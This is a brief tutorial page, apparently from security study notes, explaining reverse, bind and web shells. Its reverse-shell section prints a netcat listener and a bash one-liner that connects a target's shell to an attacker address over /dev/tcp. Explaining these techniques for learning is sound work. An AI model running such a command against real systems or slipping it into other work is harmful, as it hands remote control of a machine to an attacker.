# Shell

- [Introduction](#introduction)
- [Reverse Shell](#reverse-shell)
- [Bind Shell](#bind-shell)
- [Web Shell](#web-shell)

## Introduction

Shells are the programs that take raw input from the user via the keyboard and pass the commands to the operating system. This was the original interface of a computer. There are some tasks that a terminal is much faster at than a graphical user interface (GUI).

For the purposes of this section, my attack box is at ip address `10.10.1.10` and my target box is at ip address `10.10.1.20`.

## Reverse Shell

A reverse shell is when a target machine initiates a connection back to a listening port on the attack machine. The attack machine will start by listening on a port. The target machine will then call out to the attack machine on that port. Once this happens, the attack machine can now run commands on the target machine.

The attack box will listen on a port and wait for a connection. Here is a netcat example where the attack box listens on port 4444:

```bash
$ nc -lvnp 4444
Listening on 0.0.0.0 4444
```

The target machine will then send a connection to the listening port of the attack machine:

```bash
$ bash -i >& /dev/tcp/10.10.1.10/4444 0>&1
```

This will cause the listener to get a message like the following (the port number at the end will most likely be different):

```bash
Connection received on 10.10.1.20 42164
```

## Bind Shell

A bind shell is similar to a reverse shell except that the target machine listens or "binds" to a specific port and waits for the attack machine to connect to it.

An ssh shell is a type of bind shell.

## Web Shell

A web shell is when you can send an operating system command to a website and it will then execute that command on the server (or backend) of that machine. These can be pages that a developer left for testing or ones that are created by an upload from an attacker.

A web shell can be a page that accepts input or it could be one that only runs a command when the script is called because the command is hard coded into the page. The page might also be one that is hard coded to run a specific command but the user supplies arguments for that command.
